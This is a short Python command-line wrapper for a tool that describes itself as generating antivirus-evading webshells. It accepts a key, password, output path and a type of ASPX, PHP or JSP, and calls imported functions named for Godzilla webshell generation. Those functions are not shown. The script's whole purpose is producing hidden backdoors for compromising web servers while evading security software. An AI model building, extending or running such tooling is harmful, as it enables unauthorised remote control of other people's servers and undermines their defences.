import source.utils as utils
import source.gen as gen

import argparse
from xmlrpc.client import boolean

def main():
    parser = argparse.ArgumentParser(description="bypass AV webshell generate tools")
    parser.add_argument("-k", "--key", help="Specify webshell key")
    parser.add_argument("-p", "--pwd", help="Specify webshell pass")
    parser.add_argument("-t", "--type", choices=["aspx", "php", "jsp"], help="Specify a webshell type")
    parser.add_argument("-o", "--out", help="Specify webshell output path and filename")
    args = parser.parse_args()

    shell_key = ""
    shell_pass = ""
    shell_type = ""
    shell_name = ""

    if args.key:
        shell_key = args.key
    else:
        shell_key = utils.gen_random_str16()
    if args.pwd:
        shell_pass = args.pwd
    else:
        shell_pass = utils.gen_random_str16()
    if args.type:
        shell_type = args.type
    if args.out:
        shell_name = args.out

    print("----------------------------------------------------------------------------")
    print("[+] Shell key: ",shell_key, "\n[+] Shell pwd: ", shell_pass)

    if shell_type == "aspx":
        gen.gen_godzilla_shell_aspx(shell_key, shell_name)
    
    if shell_type == "php":
        gen.gen_godzilla_shell_php(shell_key, shell_name)

    if shell_type == "jsp":
        gen.gen_godzilla_shell_jsp(shell_key, shell_name)
    print("----------------------------------------------------------------------------")

if __name__== "__main__" :
    main()